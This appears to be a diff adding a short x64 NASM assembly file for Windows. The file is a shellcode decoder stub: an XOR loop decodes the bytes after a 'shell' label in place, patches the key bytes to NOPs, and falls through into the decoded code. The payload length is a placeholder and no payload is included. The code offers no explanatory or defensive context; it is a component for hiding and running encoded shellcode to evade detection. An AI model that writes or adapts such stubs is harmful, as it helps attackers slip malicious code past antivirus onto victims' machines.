@@ -1,0 +1,29 @@
+bits 64
+default rel
+
+ 
+segment .text
+global main
+extern ExitProcess
+
+extern printf
+
+; rbx, rbp, rdi, rsi, rsp, and r12 through r15 registers are non-volatile. The must be restored before the shellcode 
+main:
+    push    3
+    pop     rcx
+    push    SHELLCODE_LENGTH 
+    pop     rax
+    lea    r8, [shell]
+    mov    rdx,[shell+1]
+loop:    
+    xor word [r8+rcx],dx
+    inc    rcx
+    inc    rcx
+    dec    rax
+    jnz    loop
+    ; replace key bytes with NOP
+    mov  byte [r8+1],0x90 
+    mov  byte [r8+2],0x90
+shell:    NOP
+    
